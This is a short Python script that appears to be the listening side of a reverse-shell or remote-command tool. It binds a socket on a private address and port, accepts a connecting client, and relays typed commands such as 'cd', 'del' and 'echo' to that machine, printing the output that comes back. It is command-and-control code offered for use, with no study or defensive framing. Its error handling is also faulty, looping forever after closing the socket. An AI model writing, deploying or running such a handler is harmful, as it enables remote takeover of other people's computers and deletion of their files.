import socket
import os

HOST = "192.168.176.166"
PORT = 9988

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))
server.listen()
done = False

while not done:
    try:
        client,client_address = server.accept()
        print("[+]connection established!")
        for x in range(0, 1000000): #i want to be able to send the 1000000 commands before session is closed
            command = input("command> ")
            if command[:2] == "cd" and len(command) > 3:
                client.send(command.encode('ascii'))
                continue
            if command[:3] == "del" and len(command) > 4:
                client.send(command.encode('ascii'))
                continue
            if command[:4] == "echo" and len(command) > 5:
                client.send(command.encode('ascii'))
                continue
            client.send(command.encode('ascii'))
            output = client.recv(4096).decode('ascii')
            print(output)
    except:
        client.close()
        server.close()
        done = False

